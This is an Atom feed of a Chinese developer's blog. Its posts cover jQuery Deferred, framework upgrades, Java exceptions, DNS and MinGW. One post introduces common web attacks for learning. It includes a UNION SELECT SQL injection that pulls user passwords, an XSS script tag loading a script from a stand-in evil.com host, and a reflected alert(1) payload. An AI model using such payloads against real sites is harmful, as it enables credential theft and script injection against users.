<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Austin's blogs]]></title>
  <subtitle><![CDATA[Just Do it.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2015-10-25T11:39:52.921Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[Austin]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Deferred与Promise]]></title>
    <link href="http://yoursite.com/2015/10/25/JavaScript_Deferred/"/>
    <id>http://yoursite.com/2015/10/25/JavaScript_Deferred/</id>
    <published>2015-10-24T16:00:00.000Z</published>
    <updated>2015-10-25T11:39:52.921Z</updated>
    <content type="html"><![CDATA[<h3 id="一-_概念">一. 概念</h3><ol>
<li>Promise表示一个异步操作的最终结果</li>
<li>Deferred：英文意思是“延迟”，也就是延迟到未来某个点在执行。在传统的Ajax请求中， 放请求回调时，存在着两个缺陷：<code>不管成功或者失败，都只能绑定一个回调函数</code>和和 ·<code>立即执行</code>。可以将我们的一些代码用于延迟执行。</li>
</ol>
<h3 id="二-_使用">二. 使用</h3><p>常用的Promise为jquery的Promise, 可以参考JQuery API文档：[<a href="http://api.jquery.com/category/deferred-object/" target="_blank" rel="external">http://api.jquery.com/category/deferred-object/</a>]<br>我们在使用JQuery的Ajax操作的时候写法如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">        url:<span class="string">'index.html'</span>,</span><br><span class="line">        type:<span class="string">'GET'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'成功'</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"出错啦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
<p>在上面的代码中，有两个回调方法， success方法与error方法.<br>success与error方法我们都只能绑定一个回调函数。<br>在有Deferred之后， 我们可以按照如下方式来写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = $.ajax(&#123;</span><br><span class="line">      url:<span class="string">'index.html'</span>,</span><br><span class="line">        type:<span class="string">'GET'</span></span><br><span class="line">    &#125;);</span><br><span class="line">promise.done(funSuccess);</span><br><span class="line">promise.fail(funFailure);</span><br><span class="line">promise.always(funAways);</span><br></pre></td></tr></table></figure></p>
<p>这种代码与上一份代码有以下好处：</p>
<ol>
<li>封装， 代码可读性更好</li>
<li>可以同时绑定多个回调函数，会按照绑定顺序调用绑定的函数如：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">promise</span><span class="class">.done</span>(<span class="tag">funSuccess</span>);</span><br><span class="line"><span class="tag">promise</span><span class="class">.done</span>(<span class="tag">funSuccess2</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="三-_生成Promise对象">三. 生成Promise对象</h3><p>//生成Deferred对象，<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.获得Deferred对象</span></span><br><span class="line"><span class="keyword">var</span> testDeffed = <span class="keyword">new</span> $.Deferred();</span><br><span class="line">testDeffed.always(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'always'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//2.绑定回调函数</span></span><br><span class="line">testDeffed.done(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">testDeffed.done(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">testDeffed.fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fail'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//3.根据Deferred对象状态，执行相应的回调函数</span></span><br><span class="line">testDeffed.resolve(参数); <span class="comment">//执行done</span></span><br><span class="line">testDeffed.reject(参数); <span class="comment">//执行fail</span></span><br></pre></td></tr></table></figure></p>
<p>Deferred: 默认有三个状态：</p>
<ol>
<li>“pending”: 当前的Deferred正在执行中，</li>
<li>“resolved”: 当前的Deferred已经执行成功，调用resolve();</li>
<li>“rejected”: 当前的Deferred已经执行失败，调用reject();</li>
</ol>
<h3 id="四-_Promise对象合并">四. Promise对象合并</h3><p>在JQuery中可以使用$.when(p1, p2)来合并Promise， when相当于将Promise的执行情况进行逻辑与运算(AND).<br>如:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.when(promise1, promise2).done(<span class="function"><span class="keyword">function</span>(<span class="params">promise1Args, promise2Args</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
<h3 id="五-_Promise管道pipe()">五. Promise管道pipe()</h3><p>pipe:可以连接甚至多个promise对象， 且后面的promise依赖于前一个promising的执行结果如：<br>有以下代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前getPromise执行成功后， 执行另一个请求</span></span><br><span class="line"><span class="keyword">var</span> getPromise = $.get(<span class="string">'/query'</span>);</span><br><span class="line">getPromise.done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> postPromise = $.post(<span class="string">'/query'</span>, data);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
<p>在上面的代码中， 我们无法再get操作成功之前对postPromise对象绑定回调函数。<br>若用pipe方式：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getPromise = $.get(<span class="string">'/query'</span>);</span><br><span class="line"><span class="keyword">var</span> postPromise = getPromise.pipe(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;<span class="keyword">return</span> $.post&#125;);</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="一-_概念">一. 概念</h3><ol>
<li>Promise表示一个异步操作的最终结果</li>
<li>Deferred：英文意思是“延迟”，也就是延迟到未来某个点在执行。在传统的Ajax请求中， 放请求回调时，存在着两个缺陷：<code>不管成功或者失败]]>
    </summary>
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
      <category term="JavaScript" scheme="http://yoursite.com/categories/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[项目中的第三方框架升级]]></title>
    <link href="http://yoursite.com/2015/10/18/%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A1%86%E6%9E%B6%E5%8D%87%E7%BA%A7/"/>
    <id>http://yoursite.com/2015/10/18/项目中的第三方框架升级/</id>
    <published>2015-10-17T16:00:00.000Z</published>
    <updated>2015-10-18T14:42:46.263Z</updated>
    <content type="html"><![CDATA[<p>为公司内部做的一个运营系统， 由于在旧的系统基础上进行开发的， 系统是传统的SSH框架， Struts2使用的是2.3的版本，Spring使用过的是2.5.6的版本， Hibernate使用过的是3.0的版本， 在现在的开发中，通常会引入一些其他的第三方库， 在这些就得版本中， 通常会引发一些不知名的问题， 而且很难找到文档， 所以在这个周末， 下定决定，对其进行了升级。升级后的版本为：</p>
<ol>
<li>Struts： 未升级， 还是原来的2.3</li>
<li>Spring ： 4.2.2</li>
<li>Hibernate：4.3.11</li>
</ol>
<p>在升级过程中碰到了很多的细节问题， 也发现了现在系统中的代码存在一种问题：</p>
<ol>
<li>对于集合，很少使用了泛型， 造成了一些怪异的运行时错误</li>
<li>很多废弃API，方法， 属性在使用</li>
<li>大量的重复代码， 两个方法， 名字不同， 代码80%相识度</li>
<li>为了一些不知道什么原因的逻辑， 存在一些奇怪的代码逻辑</li>
</ol>
<p>所以在这次升级时候，也进行了一次清理， 这么大的改动首要的就是要保证稳定性， 这也是很多开发不敢再原有项目中进行重构，反而为了避开项目中各种问题，而写一些特殊代码， 就导致了系统越来越臃肿，代码越来越难以管理， Bug越来越多。正对于此问题， 我们可以用大量的单元测试来保证系统在大面积重构之后，保证尽量少的Bug。</p>
<p>同时在我们平时开发，写代码的时候也应该做到随时重构， 因为在写代码的时候通常会由于<strong>项目时间原因，对业务逻辑思考得不都清晰，对第三方库不熟悉， 测试代码</strong>等等原因，所以在这种情况下，应该做到随时重构。</p>
<p>另外，在写代码过程中，尽量遵循一些原则：</p>
<ol>
<li>使用集合，List, Set, Map时，使用泛型，指定类型，避免编译错误</li>
<li>尽量不使用废弃的方法， 属性，类</li>
<li>在写一些工具类的时候， 尽量查找时候有类似，以及能够满足要求的工具类</li>
<li>当在定义工具方法，类的时候， 做到分类别类，如 时间相关的就放在DateUtil.java类中， String处理相关的就放在StringUtil.java类中， 空判断相关的放在EmptyUtil.java类中</li>
<li>使用更容易明白的名字，见名知其意，当然不能一次做到，可以多次更改</li>
<li>对于相同的代码，尽量抽出方法， 也有助于理清代码逻辑</li>
<li>保持方法简洁， 短小，一个方法只做一件事</li>
<li>Java类应该遵循单一职责的原则</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>为公司内部做的一个运营系统， 由于在旧的系统基础上进行开发的， 系统是传统的SSH框架， Struts2使用的是2.3的版本，Spring使用过的是2.5.6的版本， Hibernate使用过的是3.0的版本， 在现在的开发中，通常会引入一些其他的第三方库， 在这些就得版本]]>
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2015/10/13/Gradle%E5%AD%A6%E4%B9%A0%5B1%5D/"/>
    <id>http://yoursite.com/2015/10/13/Gradle学习[1]/</id>
    <published>2015-10-13T15:08:04.838Z</published>
    <updated>2015-10-13T15:08:04.838Z</updated>
    <content type="html"><![CDATA[<h3 id="Gradle中的特征">Gradle中的特征</h3><ol>
<li>声明式编译方式以及约定优于配置的方式</li>
<li>编程式语言的的编写方式</li>
<li>组织（结构化）编译</li>
<li>深层次的API</li>
<li>支持多项目编译</li>
<li>多元化方式管理依赖</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Gradle中的特征">Gradle中的特征</h3><ol>
<li>声明式编译方式以及约定优于配置的方式</li>
<li>编程式语言的的编写方式</li>
<li>组织（结构化）编译</li>
<li>深层次的API</li>
<li>支持多项目编译</li]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java异常]]></title>
    <link href="http://yoursite.com/2015/10/08/Java%E5%BC%82%E5%B8%B8/"/>
    <id>http://yoursite.com/2015/10/08/Java异常/</id>
    <published>2015-10-07T16:00:00.000Z</published>
    <updated>2015-10-08T13:12:53.477Z</updated>
    <content type="html"><![CDATA[<h3 id="Java中的异常分类">Java中的异常分类</h3><ol>
<li><p>Checked Exception(非Runtime Exception): 非运行时异常<br>对于非运行时异常都直接继承自Exception类，这类异常会在编译期进行检查，并且必须进行处理(try.catch或者throw new Exception)<br><strong>注意</strong>:Exception类是多有异常类的父类，Java中的所有异常都会直接或间接地继承至Exception类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> - 参数错误异常，当参数不符合规定时，抛出此异常</span><br><span class="line"> - <span class="doctag">@author</span> Austin.Wang</span><br><span class="line"> - <span class="doctag">@Date</span> Oct 8, 2015</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParameterException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span><br><span class="line"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     - </span><br><span class="line">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ParameterException</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">"参数不能为空"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ParameterException</span><span class="params">(String msg)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Unchecked Exception(Runtime Exception):运行时异常<br>对于运行时异常RuntimeException类是Exception类的子类，　Java中的所有运行时异常都会直接或间接地继承至RuntimeException类，其他不是继承自RuntimeException的异常类都是非运行时异常</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Java中的异常分类">Java中的异常分类</h3><ol>
<li><p>Checked Exception(非Runtime Exception): 非运行时异常<br>对于非运行时异常都直接继承自Exception类，这类异常会在编译期进行检查，并且必须进]]>
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="Java编程" scheme="http://yoursite.com/categories/Java%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MySQL主从数据库配置]]></title>
    <link href="http://yoursite.com/2015/10/08/Mysql%E4%B8%BB%E4%BB%8E%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2015/10/08/Mysql主从配置/</id>
    <published>2015-10-07T16:00:00.000Z</published>
    <updated>2015-10-08T13:12:53.477Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="Developer" scheme="http://yoursite.com/categories/Developer/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[常见的Web攻击方式]]></title>
    <link href="http://yoursite.com/2015/10/06/Web%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2015/10/06/Web安全/</id>
    <published>2015-10-06T09:20:46.000Z</published>
    <updated>2015-10-06T13:00:48.433Z</updated>
    <content type="html"><![CDATA[<p>这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录</p>
<h3 id="1-_SQL注入攻击">1. SQL注入攻击</h3><p>通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据<br>如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> username, email, <span class="keyword">desc</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参数中添加 :<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">password</span>, 1, 1 <span class="title">from</span> <span class="title">users</span>,</span></span><br></pre></td></tr></table></figure></p>
<p>通过以上参数将组成新的SQL语句如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> username, email, <span class="keyword">desc</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>通过此SQL就能查出用户的密码了</p>
<h3 id="2-XSS跨站脚本攻击(Cross_Site_Script)">2.XSS跨站脚本攻击(Cross Site Script)</h3><p>发生在目标网站中目标用户的浏览器中，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时， XSS就会发生。<br>一般通过注入类似下面的代码引入第三方域上的脚本资源：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.evil.com/xss.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>以上方式有原因如下：</p>
<ol>
<li>攻击代码容易控制</li>
<li>利用script标签本身就可以嵌入第三方资源的特性，就突破了浏览器的同源策略<h4 id="XSS的类型">XSS的类型</h4></li>
<li><p><strong>反射性XSS(非持久型XSS)</strong>: 发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后在响应内容中出现XSS代码， 最后浏览器解析执行。如：若服务器端将参数x不做任何过滤就直接输出</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com?x=<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 那么<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>就会输出到响应体中，浏览器就会解析执行</p>
</li>
<li><strong>存储型XSS(持久型XSS)</strong></li>
<li><strong>DOM XSS</strong><h5 id="浏览器的同源策略">浏览器的同源策略</h5> 同源策略： 不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源</li>
<li><p>如何区分不同域域同域栈<br> 同域： 需要满足<strong>同协议，同域名， 同端口</strong>，才能叫做同域： 如<br> 基准域<code>http://www.test.com</code></p>
<p> | 站点 | 是否同域| 原因<br> |——|———|—–<br> |<a href="https://www.test.com" target="_blank" rel="external">https://www.test.com</a> | 不同域 | 协议不同， http与https是不同的协议<br> |<a href="http://blog.test.com|不同域|域名不同，blog与www是不同的子域" target="_blank" rel="external">http://blog.test.com|不同域|域名不同，blog与www是不同的子域</a><br> |<a href="http://test.com" target="_blank" rel="external">http://test.com</a> |不同域|域名不同，顶级域域www子域不是一个概念<br> |<a href="http://www.test.com:8080|不同域|端口不同，8080与默认80为不同端口" target="_blank" rel="external">http://www.test.com:8080|不同域|端口不同，8080与默认80为不同端口</a><br> |<a href="http://www.test.com/blog/|同域|满足" target="_blank" rel="external">http://www.test.com/blog/|同域|满足</a></p>
<h3 id="3-_CSRF_跨站请求伪造">3. CSRF 跨站请求伪造</h3><p> 通常在使用XSS时，需要目标站点有XSS漏洞，也就是可以执行请求中的脚本代码。若是无XSS漏洞，则无法完成攻击。而CSRF就是在不同域目标网站的站点B中，构造一个访问目标站点的请求，而诱使用户进入构造的B站点中，发起伪造的请求。<br> 起其好处是： 可以做到无脚本Javascript参与，轻松绕过不同域的跨域请求问题。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录</p>
<h3 id="1-_SQL注入攻击">1. SQL注入攻击</h3><p>通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数]]>
    </summary>
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
      <category term="Hexo Blog" scheme="http://yoursite.com/categories/Hexo-Blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[域名解析]]></title>
    <link href="http://yoursite.com/2015/10/05/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2015/10/05/域名解析/</id>
    <published>2015-10-04T16:00:00.000Z</published>
    <updated>2015-10-05T06:45:11.369Z</updated>
    <content type="html"><![CDATA[<p>域名解析是把域名指向网站IP，让人们可以通过直接访问域名就能访问到网站。<br>IP地址是网络上标示站点的数字地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。<br><strong>注意</strong>：只有dns设置为iidns的域名才能在易名中国进行域名解析操作，使用其它DNS的域名请到相应的网站去进行操作。</p>
<h3 id="1-_常用的主机记录">1. 常用的主机记录</h3><pre><code><span class="number">1</span>. www：解析后的域名为 www<span class="class">.ename</span><span class="class">.com</span> 
<span class="number">2</span>. @：空主机头，直接解析主域名ename<span class="class">.com</span> 
<span class="number">3</span>. *：泛解析，匹配其他所有域名 *<span class="class">.ename</span><span class="class">.com</span>
<span class="number">4</span>. 除空主机头和泛解析外，主机头的构成只允许“<span class="number">0</span>-<span class="number">9</span>/a-z/-”，即数字字母中划线这<span class="number">3</span>种，但不能以“-”开头或结尾。
<span class="number">5</span>. 主机记录不需要包括域名本身。例如域名是ename.com，主机头填写“www”即可，填写成“www<span class="class">.ename</span><span class="class">.com</span>”是错误的。
</code></pre><h3 id="2-_常见的域名解析记录类型">2. 常见的域名解析记录类型</h3><pre><code><span class="number">1.</span> A：地址记录，用来指定域名的IPv4地址（如：<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>），如果需要将域名指向一个IP地址，就需要添加A记录。 
<span class="number">2.</span> CNAME：如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。 
<span class="number">3.</span> MX：如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。 
<span class="number">4.</span> URL隐藏：隐藏转发，需要审核。从一个地址<span class="number">301</span>重定向到另一个地址的时候，就需要添加URL记录。 
<span class="number">5.</span> URL非隐藏：非隐藏转发，需要审核，从一个地址<span class="number">301</span>重定向到另一个地址的时候，就需要添加URL记录。 
<span class="number">6.</span> NS：域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。 
<span class="number">7.</span> TXT：在这里可以填写任何东西，长度限制<span class="number">200</span>。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。 
<span class="number">8.</span> AAAA：用来指定主机名（或域名）对应的IPv6地址（例如：ff06:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:c3）记录。。
</code></pre><h3 id="3-_轮询A记录">3. 轮询A记录</h3><pre><code>只有<span class="literal">A</span>记录可以设置轮询，即可以添加多个同主机头同线路但不同记录值的解析记录。
批量修改解析页面右侧，有轮询<span class="literal">A</span>记录的选项：跳过/覆盖
</code></pre><h3 id="4-_动态域名解析">4. 动态域名解析</h3><pre><code>动态域名解析是指将域名解析到动态<span class="literal">IP</span>。以当前较多人用的nat123动态域名解析为例
，使用动态域名解析，可以在动态公网<span class="literal">IP</span>环境下，做网站服务，即使<span class="literal">IP</span>变化，也不会
影响到网站域名访问。
</code></pre><h3 id="5-_内网映射到外网">5. 内网映射到外网</h3><pre><code>主要是通过路由其中或者工具(如花生壳), 将通过端口映射到内网中的某一机器，从
而实现可以将内网机器作为外网服务器访问。
如：
    <span class="number">1.</span> 每一台链接到wlan的网络都会有一个外网地址，路由器中可以查看
    <span class="number">2.</span> 当我们通过访问这个外网IP时，就能找到我们的路由器。
        如：我的路由器外网IP为： <span class="number">183.59</span><span class="number">.113</span><span class="number">.135</span>
    <span class="number">3.</span> 在路由器中或者工具中映射某一端口到内网某一IP地址
        如：设置端口 <span class="number">8911</span> --指向--&gt; 内网机机器的某一应用 ： <span class="number">192.168</span><span class="number">.1</span><span class="number">.104</span>:<span class="number">4000</span>(服务在内网机器，通过<span class="number">4000</span>端口访问), 
    <span class="number">4.</span> 当我们访问此端口时候，路由器就能通过端口映射寻找到内网机器，并访问应用
        这样我们就能通过<span class="number">183.59</span><span class="number">.113</span><span class="number">.135</span>:<span class="number">8911</span>来访问到我内网机器的应用了
</code></pre><h3 id="6-_相关工具">6. 相关工具</h3><pre><code><span class="bullet">1. </span>花生壳： [<span class="link_label">官网</span>](<span class="link_url">http://www.oray.com/</span>)
<span class="code">    1. 只能动态映射自己的二级域名或者在花生壳购买或者转入到花生壳中的域名，不支持外部域名</span>
<span class="code">    2. 可以实现内网映射</span>
<span class="bullet">2. </span>Nat123:<span class="xml"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.nat123.com/Pages_2_32.jsp"</span>&gt;</span></span>官网<span class="xml"><span class="tag">&lt;/<span class="title">a</span>&gt;</span></span>
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>域名解析是把域名指向网站IP，让人们可以通过直接访问域名就能访问到网站。<br>IP地址是网络上标示站点的数字地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。<br><strong>注意</strong>：只有dns设置为iidns的域名才能在]]>
    </summary>
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows下使用GUN(Linux)命令行]]></title>
    <link href="http://yoursite.com/2015/10/04/MSYS-Mingw/"/>
    <id>http://yoursite.com/2015/10/04/MSYS-Mingw/</id>
    <published>2015-10-03T16:00:00.000Z</published>
    <updated>2015-10-05T06:45:04.476Z</updated>
    <content type="html"><![CDATA[<h2 id="在windows中使用LInux的命令。可以通过如下方法实现">在windows中使用LInux的命令。可以通过如下方法实现</h2><h3 id="1-_使用MinGW以及其中的Linux命令套件">1. 使用MinGW以及其中的Linux命令套件</h3><pre><code>1. 介绍
    MinGW：Windows环境提供完整的开源编程工具集， 且不依赖于第三方的C运行库(DLLs), 只是一套最小化的GNU开发环境集合，并不提供GNU软件的运行环境，如需要运行环境，可以使用<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.cygwin.com/"</span>&gt;</span>Cygwin<span class="tag">&lt;/<span class="title">a</span>&gt;</span>或者
    MSYS：是一套GUN工具集， 如 bash,make,gawk以及grep， 允许你通过传统的UNIX工具来构建应用， 其目标在于补充MinGW和CMD shell的不足，作为cmd.exe的替换.需要与MinGW同时使用
2. 安装
    1. 安装 MinGW， 且安装其中的MYSYS包
        1. 从<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.mingw.org/"</span>&gt;</span>官网<span class="tag">&lt;/<span class="title">a</span>&gt;</span>下载安装包， 若使用64位,则从<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://mingw-w64.org/doku.php"</span>&gt;</span>mingw-w64<span class="tag">&lt;/<span class="title">a</span>&gt;</span>下载
        2. 直接安装，注意安装路径中不能有空格，如：c:\mingw
        3. 选择需要安装的工具包， 我这里选择了mingw-developer-toolkit与mingw32-base, 它会自动选择相关的依赖项
    2. 第二种方式，只安装 MSYS
        1. 从<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"http://www.mingw.org/wiki/MSYS"</span>&gt;</span>官网 <span class="tag">&lt;/<span class="title">a</span>&gt;</span>下载安装包
        2. 直接安装，注意安装路径中不能有空格，如：c:\msys
        3. 添加msys的安装目录到环境变量的path中，如： C:\msys\1.0
3. 使用
    1. 进入c:\mingw/msys/1.0或者 C:\msys\1.0，运行msys.bat.bat。打开的的cmd终端，不支持中文。
    2. 为了支持中文，安装mintty终端，它支持xterm终端
        1. 下载<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"https://code.google.com/p/mintty/downloads/list"</span>&gt;</span>mintty<span class="tag">&lt;/<span class="title">a</span>&gt;</span>的Msys版本
